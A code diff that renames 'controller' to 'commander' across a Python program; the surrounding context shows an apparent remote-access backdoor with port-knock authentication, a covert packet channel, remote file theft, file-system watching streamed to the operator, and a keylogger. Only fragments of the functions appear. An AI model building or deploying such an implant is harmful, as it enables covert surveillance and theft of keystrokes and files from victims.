@@ -482,7 +482,7 @@ def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
 
 def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_written, timeout):
     """After the final chunk is written, keep listening briefly for the END marker
-    and re-ACK any duplicate chunk headers from in-flight controller retries."""
+    and re-ACK any duplicate chunk headers from in-flight commander retries."""
     deadline = time.time() + timeout
     while True:
         remaining = deadline - time.time()
@@ -501,7 +501,7 @@ def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_writte
 
 
 def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
-    """Send one inotify event line to controller with no ACK (fire-and-forget).
+    """Send one inotify event line to commander with no ACK (fire-and-forget).
     seq=0 carries the byte length; seq=1..N carry 2 bytes of UTF-8 text each."""
     text = line.encode("utf-8")
     n = len(text)
@@ -516,8 +516,8 @@ def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
 
 
 def _watch_and_stream(ctx: Context, recursive: bool):
-    """Receive the path to watch from controller, start inotify, and stream events back
-    until controller sends WATCH_STOP or WATCH_TIMEOUT_SECONDS elapses."""
+    """Receive the path to watch from commander, start inotify, and stream events back
+    until commander sends WATCH_STOP or WATCH_TIMEOUT_SECONDS elapses."""
     try:
         from inotify_simple import INotify, flags as iflags
     except ImportError:
@@ -604,7 +604,7 @@ def _watch_and_stream(ctx: Context, recursive: bool):
                 for d in dirs:
                     inotify.add_watch(os.path.join(root, d), watch_flags)
 
-        print(f"[WATCH] watching — send stop from controller or wait {WATCH_TIMEOUT_SECONDS}s")
+        print(f"[WATCH] watching — send stop from commander or wait {WATCH_TIMEOUT_SECONDS}s")
         deadline = time.time() + WATCH_TIMEOUT_SECONDS
         inotify_fd = inotify.fileno()
 
@@ -787,7 +787,7 @@ def parse_arguments(ctx: Context, argv: list[str] | None = None):
                         help="network interface to sniff on (default: scapy default)")
     parser.add_argument("-k", "--key", dest="key", required=True,
                         metavar="<key>",
-                        help="pre-shared key string (must match controller)")
+                        help="pre-shared key string (must match commander)")
     try:
         parsed = parser.parse_args(argv)
     except SystemExit as exc:
@@ -807,11 +807,11 @@ def handle_arguments(ctx: Context):
 
 
 def wait_for_session(ctx: Context):
-    result: dict[str, str | None] = {"controller_ip": None}
+    result: dict[str, str | None] = {"commander_ip": None}
     done = threading.Event()
 
-    def on_authenticated(controller_ip):
-        result["controller_ip"] = controller_ip
+    def on_authenticated(commander_ip):
+        result["commander_ip"] = commander_ip
         done.set()
 
     watcher = KnockWatcher(on_authenticated)
@@ -830,7 +830,7 @@ def wait_for_session(ctx: Context):
         if sniffer.running:
             sniffer.stop(join=True)
 
-    ctx.connected_to = result["controller_ip"]
+    ctx.connected_to = result["commander_ip"]
 
 
 def establish_session(ctx: Context):
@@ -999,7 +999,7 @@ def receive_file(ctx: Context):
 def send_file(ctx: Context):
     """Handle CMD_REQUEST_FILE: receive the requested path, read the file,
     stream the bytes back via the chunked protocol. An empty stream signals
-    'not found / unreadable' to controller."""
+    'not found / unreadable' to commander."""
     if not ctx.connected_to:
         return
 
@@ -1032,7 +1032,7 @@ def send_file(ctx: Context):
             requested_path = path_bytes.decode("utf-8")
         except UnicodeDecodeError:
             requested_path = path_bytes.decode("utf-8", errors="replace")
-        print(f"[SEND] controller requested: {requested_path!r}")
+        print(f"[SEND] commander requested: {requested_path!r}")
 
         try:
             with open(requested_path, "rb") as f:
@@ -1081,7 +1081,7 @@ def run_kl(ctx: Context):
         from keys import list_devices_for_remote, start_logger
 
         device_list_text, devices = list_devices_for_remote()
-        print(f"[KL] Sending {len(devices)} keyboard options to controller...")
+        print(f"[KL] Sending {len(devices)} keyboard options to commander...")
 
         send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
 
